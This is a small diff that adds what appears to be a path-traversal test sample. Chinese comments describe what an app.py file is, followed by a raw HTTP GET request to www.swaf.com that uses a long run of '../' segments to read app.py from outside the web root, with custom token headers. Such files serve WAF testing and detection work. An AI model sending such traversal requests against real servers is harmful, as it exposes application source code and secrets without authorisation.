@@ -1,0 +1,11 @@
+# 目录遍历_app.py
+# app.py通常是指Python应用程序中的主要代码文件。在Python中，app.py文件通常包含应用程序的入口点，它会执行应用程序的逻辑并处理相关的操作。
+# 
+# 在app.py文件中，通常会导入所需的模块和库，定义应用程序的路由和视图函数，以及执行其他应用程序逻辑。
+GET /../../../../../../../../../../../app.py?acid=80050821&bid=hd_tag_m8mv24kt HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24kt
+RM-PRO-Token: 6eea17ef8bf9a64a56a71ff549c0fd48
+RM-PRO-Time: 1742808389111
+User-Agent: curl/7.83.1
+
